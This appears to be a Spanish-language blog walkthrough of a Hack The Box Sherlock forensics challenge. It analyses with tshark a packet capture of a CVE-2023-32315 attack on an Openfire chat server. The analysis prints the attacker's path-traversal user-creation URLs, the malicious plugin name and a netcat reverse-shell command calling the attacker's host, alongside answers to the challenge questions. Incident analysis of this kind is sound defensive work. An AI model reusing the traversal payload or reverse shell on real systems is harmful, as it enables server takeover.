---
layout: single
title: Sherlock - Compromised_Chat_Server
excerpt: Anális de una captura de red sobre un ataque de RCE
date: 2026-9-29
classes: wide
header:
   teaser: ../assets/images/logoletsdefend.png
   teaser_home_page: true
   icon: ../assets/images/hackthebox.webp
categories:
   - hackthebox
   - soc
   - blue team
   - dfir
tags:
   - wireshark
   - tshark
   - pcap analysis
   - network analysis
   - dfir
   - rce
   - linux
   - awk
   - persistence
   - http
   - rce
   - reverse shell
   - tcp
---

**Scenario: In the company, one of our teams uses Openfire, an XMPP-based chat server for their communications. Recently, the L1 analyst detected suspicious activity on the server, including abnormal login attempts and traffic spikes. Further investigation suggests a potential exploitation of CVE-2023-32315, a critical vulnerability in Openfire allowing remote code execution. To confirm this, the L1 analyst captured a packet capture (PCAP) of the server's network traffic. As an investigator, your task is to analyze the PCAP, identify any signs of compromise, and trace the attacker's actions.**

-----------

**1\. How many GET requests are there in total?**

Con el siguiente filtro en `tshark`:

```bash
┌──(kali㉿kali)-[~/Documents/nueva_era_sherlocks/compromisedchatserver]
└─$ tshark -r http-capture-1.pcapng -Y "http.request.method == GET" | wc -l 
128
```

-------------------

**2\. What is the host value in the first HTTP packet?**

Con `tshark`:

```bash
┌──(kali㉿kali)-[~/Documents/nueva_era_sherlocks/compromisedchatserver]
└─$ tshark -r http-capture-1.pcapng -Y "http.request.method == GET" -T fields -e http.referer | head -n 1
http://192.168.18.155:9090/
```

Es hacia `192.168.18.155:9090`

-------------

**3\. What is the CSRF token value for the first login request?**

Identificamos los primeros intentos de login:

```bash
┌──(kali㉿kali)-[~/Documents/nueva_era_sherlocks/compromisedchatserver]
└─$ tshark -r http-capture-1.pcapng -Y "http" | grep -i "login"           
   32 8.761761389 192.168.18.1 51373 192.168.18.155 9090 HTTP 658 GET /login.jsp?url=%2Findex.jsp HTTP/1.1 
   38 11.274906608 192.168.18.1 51373 192.168.18.155 9090 HTTP 684 GET /login.jsp?url=%2Findex.jsp HTTP/1.1 
   42 12.371870185 192.168.18.1 51373 192.168.18.155 9090 HTTP 684 GET /login.jsp?url=%2Findex.jsp HTTP/1.1 
   62 29.934189262 192.168.18.1 51373 192.168.18.155 9090 HTTP 884 POST /login.jsp HTTP/1.1  (application/x-www-form-urlencoded)
  347 49.269027357 192.168.18.1 51398 192.168.18.155 9090 HTTP 667 GET /login.jsp?url=%2Findex.jsp HTTP/1.1 
  770 145.022179540 192.168.18.150 50860 192.168.18.155 9090 HTTP 494 GET /login.jsp?url=%2Findex.jsp HTTP/1.1 
  808 145.075362482 192.168.18.150 50888 192.168.18.155 9090 HTTP 472 GET /style/login.css HTTP/1.1 
  833 145.083888240 192.168.18.150 50860 192.168.18.155 9090 HTTP 485 GET /images/login_logo.gif HTTP/1.1 
  887 148.199586158 192.168.18.150 50860 192.168.18.155 9090 HTTP 516 GET /login.jsp?url=%2Findex.jsp HTTP/1.1 
  927 157.580705072 192.168.18.150 50860 192.168.18.155 9090 HTTP 749 POST /login.jsp HTTP/1.1  (application/x-www-form-urlencoded)
```

se manda un post al login, ese es el paquete que buscamos, con el siguientes filtros, primero vemos las keys:

```bash
┌──(kali㉿kali)-[~/Documents/nueva_era_sherlocks/compromisedchatserver]
└─$ tshark -r http-capture-1.pcapng -Y "http.request.method == POST" -T fields -e urlencoded-form.key | head -n 1
url,login,csrf,username,password
```

Y luego obtenemos los valores:

```bash
┌──(kali㉿kali)-[~/Documents/nueva_era_sherlocks/compromisedchatserver]
└─$ tshark -r http-capture-1.pcapng -Y "http.request.method == POST" -T fields -e urlencoded-form.value | head -n 1
/index.jsp,true,A2HxEJfAcs31PlD,admin,adminnothere
```

---------

**4\. What is the password of the first user who logged in?**

En la primera pregunta anterior vemos en los campos el usuario y contraseña: `admin:adminnothere`

--------

**5\. What is the first username that was created by the attacker?**

Revisando las rutas a las que el usuario llamó, vemos dos hacia `create-user`:

```bash
┌──(kali㉿kali)-[~/Documents/nueva_era_sherlocks/compromisedchatserver]
└─$ tshark -r http-capture-1.pcapng -Y "http" | awk -F' ' '{print $10}' | sort | uniq -c                       
     1 /setup/setup-s/%u002e%u002e/%u002e%u002e/user-create.jsp?csrf=sdUynymrYcvX9Kl&username=umu6od&name=&email=&password=koi807&passwordConfirm=koi807&isadmin=on&create=%E5%88%9B%E5%BB%BA%E7%94%A8%E6%88%B7
     1 /setup/setup-s/%u002e%u002e/%u002e%u002e/user-create.jsp?csrf=ugtHUF86COH6frO&username=byvr3r&name=&email=&password=wjlu1r&passwordConfirm=wjlu1r&isadmin=on&create=%E5%88%9B%E5%BB%BA%E7%94%A8%E6%88%B7
```

Quitando el URLencode nos queda: `username=umu6od:password=koi807`

----------

**6\. How many user accounts did the attacker create?**

Contamos `2` post al endpoint de `user-create` en el resultado de la pregunta anterior

-------

**7\. What is the username that the attacker used to log in to the admin panel?**

Revisando los POST:

```bash
┌──(kali㉿kali)-[~/Documents/nueva_era_sherlocks/compromisedchatserver]
└─$ tshark -r http-capture-1.pcapng -Y "http.request.method == POST"                                             
   62 29.934189262 192.168.18.1 51373 192.168.18.155 9090 HTTP 884 POST /login.jsp HTTP/1.1  (application/x-www-form-urlencoded)
  486 140.935144327 192.168.18.150 55524 23.63.111.217 80 OCSP 470 Request
  502 141.058507802 192.168.18.150 55524 23.63.111.217 80 OCSP 470 Request
  593 142.102148214 192.168.18.150 55524 23.63.111.217 80 OCSP 470 Request
  633 142.512445031 192.168.18.150 51658 216.58.196.195 80 OCSP 467 Request
  662 142.683845944 192.168.18.150 55524 23.63.111.217 80 OCSP 470 Request
  875 147.335786082 192.168.18.150 42402 23.63.111.217 80 OCSP 470 Request
  927 157.580705072 192.168.18.150 50860 192.168.18.155 9090 HTTP 749 POST /login.jsp HTTP/1.1  (application/x-www-form-urlencoded)
 1172 159.023829761 192.168.18.150 55524 23.63.111.217 80 OCSP 470 Request
 1354 168.037480775 192.168.18.150 33270 23.63.111.217 80 OCSP 470 Request
 1386 168.203208235 192.168.18.150 33270 23.63.111.217 80 OCSP 470 Request
 1458 168.610422092 192.168.18.150 43454 23.63.111.227 80 OCSP 469 Request
 1560 169.125435056 192.168.18.150 45480 152.195.38.76 80 OCSP 470 Request
 1659 176.931147925 192.168.18.150 50860 192.168.18.155 9090 HTTP 2584 POST /plugin-admin.jsp?uploadplugin&csrf=ezjXgxeukj217hp HTTP/1.1  (application/java-archive)
 1785 187.764595014 192.168.18.150 50860 192.168.18.155 9090 HTTP 783 POST /plugins/openfire-management-tool-plugin/cmd.jsp HTTP/1.1  (application/x-www-form-urlencoded)
 1869 198.751841714 192.168.18.150 50860 192.168.18.155 9090 HTTP 770 POST /plugins/openfire-management-tool-plugin/cmd.jsp?action=command HTTP/1.1  (application/x-www-form-urlencoded)
 1960 223.059558291 192.168.18.150 50860 192.168.18.155 9090 HTTP 803 POST /plugins/openfire-management-tool-plugin/cmd.jsp?action=command HTTP/1.1  (application/x-www-form-urlencoded)
```

Observamos que se hace un POST al login en `/login.jsp`, y posteriormente se hace otro post a un panel de administración en `/plugin-admin.jsp`, por loque podemos asumir que el login al que nos referimos es con el que se accedió a dicho panel.
Obteniendo la info:

```bash
┌──(kali㉿kali)-[~/Documents/nueva_era_sherlocks/compromisedchatserver]
└─$ tshark -r http-capture-1.pcapng -Y "http.request.method == POST" -T fields -e urlencoded-form.value            
/index.jsp,true,A2HxEJfAcs31PlD,admin,adminnothere
/index.jsp,true,ntHUa5rbtlcns8l,byvr3r,wjlu1r
```

La segunda linea es nuestra respuesta.

-----------

**8\. What is the name of the plugin that the attacker uploaded?**

Esto se hace con una petición POST, usando el siguiente filtro:

```bash
┌──(kali㉿kali)-[~/Documents/nueva_era_sherlocks/compromisedchatserver]
└─$ tshark -r http-capture-1.pcapng -Y "http.request.method == POST" -T fields -e mime_multipart.header.content-disposition | awk 'NF'
form-data;name="uploadfile";filename="openfire-management-tool-plugin.jar"
``` 

Nuestro archivos es `filename="openfire-management-tool-plugin.jar"`

-----------------

**9\. What is the first command executed by the user?**

Los comandos se envían por el plugin identificado en la pregunta anterior, revisando los argumentos que se envían:

```bash
┌──(kali㉿kali)-[~/Documents/nueva_era_sherlocks/compromisedchatserver]
└─$ tshark -r http-capture-1.pcapng -Y "http.request.method == POST" -T fields -e urlencoded-form.value | awk 'NF' 
/index.jsp,true,A2HxEJfAcs31PlD,admin,adminnothere
/index.jsp,true,ntHUa5rbtlcns8l,byvr3r,wjlu1r
,,123,Login
whoami
nc 192.168.18.150 8888 -e /bin/bash
```

Se ejecuta un `whoami`, clásico comando de reconocimiento.

--------------

**10\. What is the last command that the attacker used on the server?**

El atacante crea una reverse shell, tenemos que encontrar los comandos que ejecutó desde dicha sesión:

```bash
┌──(kali㉿kali)-[~/Documents/nueva_era_sherlocks/compromisedchatserver]
└─$ tshark -r http-capture-1.pcapng -Y "tcp.stream == 53" -T fields -e tcp.payload | xxd -r -p
whoami
root
id
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
uname -a
Linux 83e61ce1df45 5.15.0-25-generic #25-Ubuntu SMP Wed Mar 30 15:54:22 UTC 2022 x86_64 Linux
```

Ejecuta un `uname -a`.
